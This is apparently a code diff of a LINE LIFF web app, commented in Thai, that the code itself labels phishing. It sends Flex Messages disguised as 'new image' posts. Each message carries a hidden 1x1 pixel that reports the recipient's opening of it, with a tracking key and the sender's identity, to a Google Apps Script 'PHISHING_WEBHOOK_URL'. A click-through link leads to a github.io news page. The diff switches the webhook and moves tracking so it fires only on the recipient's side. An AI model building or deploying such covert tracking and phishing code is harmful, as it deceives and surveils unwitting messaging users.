@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbz99dQaLFKnnUD4cqgJYVn3X3wgL6AK3V1HJm7KJjWIwGNqa1wxspZ3-qX8tR5dsCI8GQ/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbz3cvLYfYU7upSR8yHiETRG7asJW84_98mFGY7qHXcKGKkNquawkRqZYnmLjqhxs3MV_A/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,29 +820,16 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน zeroClickTrackUrl
-                const deviceInfo = getEnhancedDeviceInfo();
-                const ipInfo = await getIPInfo();
-                
-                // สร้าง randomSuffix และ sessionToken สำหรับแยกระหว่างผู้ส่งและผู้รับ
+                // สร้าง URL สำหรับ Zero Click tracking
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
-                const sessionToken = generateUniqueId(); // ใช้เป็น token เฉพาะสำหรับแยกแยะผู้ส่งและผู้รับ
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&isTarget=true`;
                 
-                // เก็บ sessionToken ใน localStorage เพื่อระบุว่านี่คือผู้สร้าง
-                localStorage.setItem(`creator_${trackingKey}`, sessionToken);
-                
-                // สร้าง Base URL สำหรับ Zero Click tracking
-                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
-                
-                // เพิ่ม sessionToken เพื่อให้ระบบรู้ว่านี่เป็นผู้สร้าง (ไม่ใช่เป้าหมาย)
-                zeroClickTrackUrl += `&session=${sessionToken}&is_creator=1`;
-                
-                // ข้อมูลเกี่ยวกับอุปกรณ์เพิ่มเติม
+                // เพิ่ม random parameter เพื่อป้องกันการแคช
                 zeroClickTrackUrl += `&r=${randomSuffix}`;
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message ที่ใช้วิธีใหม่สำหรับ Zero Click Tracking
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพและมี tracker ที่มองไม่เห็น
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -859,31 +846,26 @@
                                 uri: clickTrackUrl
                             }
                         },
-                        // ใช้ footer ที่มองไม่เห็นเพื่อแทรก zero-click tracking
+                        // เพิ่ม footer ซ่อนที่มี zero-click tracking pixel
                         footer: {
                             type: 'box',
                             layout: 'vertical',
                             contents: [
+                                // รูปภาพที่มองไม่เห็น (1x1 pixel) สำหรับ zero-click tracking
                                 {
                                     type: 'image',
-                                    url: `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}&is_target=1&t=${Date.now()}`,
-                                    size: '1px', // ขนาดเล็กมากจนมองไม่เห็น
+                                    url: zeroClickTrackUrl,
+                                    size: '1px', // ขนาดเล็กมาก
                                     aspectRatio: '1:1',
-                                    aspectMode: 'cover'
-                                },
-                                {
-                                    type: 'box',
-                                    layout: 'vertical',
-                                    contents: [],
-                                    height: '1px',
-                                    margin: 'none',
-                                    spacing: 'none'
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetBottom: '0px',
+                                    offsetStart: '0px'
                                 }
                             ],
-                            height: '1px',
                             paddingAll: '0px',
-                            spacing: 'none',
-                            margin: 'none'
+                            height: '1px',
+                            position: 'relative'
                         }
                     }
                 };
@@ -911,6 +893,8 @@
                             showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
                         }
 
+                        // ไม่เรียก Zero Click tracking ในฝั่งผู้ส่งอีกต่อไป - ระบบจะทำงานเมื่อผู้รับเปิดข้อความแทน
+                        
                         // รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
